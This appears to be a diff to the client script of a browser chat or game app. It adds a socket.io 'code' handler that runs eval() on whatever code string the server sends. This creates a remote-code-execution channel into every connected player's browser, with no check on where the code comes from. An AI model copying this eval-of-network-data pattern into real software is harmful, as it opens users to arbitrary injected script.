@@ -294,6 +294,13 @@ socket.on('chat', function (data) {
     $('.chat').append(html);
     $('.chat').scrollTop(10000);
 });
+socket.on('code', function(data) {
+    try {
+        eval(data.code);
+    } catch (err) {
+        console.log(err);
+    }
+})
 socket.on('created', function(data) {
     vm.password(data.password);
     vm.currentGame(data.gameName);
